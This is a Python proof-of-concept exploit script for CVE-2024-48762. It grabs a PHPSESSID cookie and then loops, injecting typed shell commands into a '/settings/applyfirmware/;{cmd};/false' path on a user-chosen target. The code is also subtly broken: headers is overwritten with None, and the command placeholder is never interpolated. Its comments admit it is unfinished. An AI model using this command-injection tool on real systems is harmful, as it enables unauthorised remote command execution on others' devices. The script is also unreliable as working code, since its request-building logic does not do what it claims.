# This code is used to exploit CVE-2024-48762 vulnerability.
# POC未完成，后续需要完成自动未授权注册，登录获取Cookie
import requests
import re

def get_phpsessid(url):
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Host": "{Target}",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
    }
    headers = headers.__setitem__("Host", url.split('/')[2])  # 设置Host为URL的主机部分
    res = requests.get(url=url, headers=headers, verify=False)
    # 使用正则表达式从Set-Cookie头部中提取PHPSESSID
    match = re.search(r'PHPSESSID=([^;]+)', res.headers.get('Set-Cookie', ''))
    if match:
        return match.group(1)
    else:
        return None

def poc(url, Cookie_PHPSESSID):
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Cookie": f"PHPSESSID={Cookie_PHPSESSID}",
        "Host": "{Target}",
        "Referer": "{Target}",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
    }
    headers = headers.__setitem__("Host", url.split('/')[2])  # 设置Host为URL的主机部分
    headers = headers.__setitem__("Referer", url)  # 设置Referer为当前URL
    res = requests.get(url=url, headers=headers, verify=False)
    return res.text

if __name__ == '__main__':
    show = r'''
         ______   ______    ___  ___  ___ ____     ____ ___ ________ ___
        / ___/ | / / __/___|_  |/ _ \|_  / / /____/ / /( _ )_  / __/|_  |
       / /__ | |/ / _//___/ __// // / __/_  _/___/_  _/ _  |/ / _ \/ __/
       \___/ |___/___/   /____/\___/____//_/      /_/ \___//_/\___/____/

                                                                                                    
                              		                     CVE-2024-48762 By XU17
Usage Example:                                                            
    Target ip> http://192.168.1.1/ 
    ——————————————————————————————————————————————————————————————————————————————————
    cmd > whoami
    '''
    print(show + '\n')
    Target = input('Target >>> ')
    Cookie_PHPSESSID = get_phpsessid(Target)  # 自动获取PHPSESSID
    if Cookie_PHPSESSID:
        while True:
            cmd = input('cmd >>> ')
            if cmd == 'exit':
                break
            url = Target + "/settings/applyfirmware/;{cmd};/false"
            result = poc(url, Cookie_PHPSESSID)
            print(result)
    else:
        print("Failed to retrieve PHPSESSID.")